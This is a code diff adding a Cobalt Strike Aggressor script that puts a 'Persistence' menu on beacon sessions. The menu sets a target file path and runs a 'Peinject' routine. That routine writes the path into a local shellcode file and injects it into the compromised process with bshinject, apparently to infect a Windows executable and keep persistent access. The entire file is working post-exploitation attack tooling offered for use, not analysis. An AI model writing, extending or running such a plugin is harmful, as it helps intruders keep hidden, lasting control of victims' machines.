@@ -1,0 +1,33 @@
+popup beacon_bottom
+{
+menu "Persistence"
+	{
+	item "Set filepath"
+		{
+	 	local('$bid');
+        foreach $bid ($1)
+        	{
+        	prompt_text("FilePath:", $filepath, {$filepath = $1;return $filepath;});
+        	}
+		}
+	item "Peinject"
+		{
+			local('$hrfile $hafile $hfile $bid $buf');
+        	foreach $bid ($1)
+        	{
+            blog($bid,"PE inject to filepath: $filepath");
+            $hrfile = openf("E:\\win_cs4\\third-party\\Peinject\\peinject.bin");
+            $buf = readb($hrfile,-1);closef($hrfile);
+            $hafile = openf(">>E:\\win_cs4\\third-party\\Peinject\\peinject.bin");
+            writeb($hafile, $filepath);closef($hafile);
+            $curr_pid = beacon_info($bid, "pid");
+            bshinject($bid, $curr_pid, "x86", script_resource("peinject.bin"));
+            blog($bid, "Waiting a few seconds for peinject complete...");
+            bpause($bid, 10000);
+            $hfile = openf(">E:\\win_cs4\\third-party\\Peinject\\peinject.bin");
+            writeb($hfile, $buf);closef($hfile);
+            blog($bid, "persistence-peinject complete");
+			}
+		}
+	}
+}
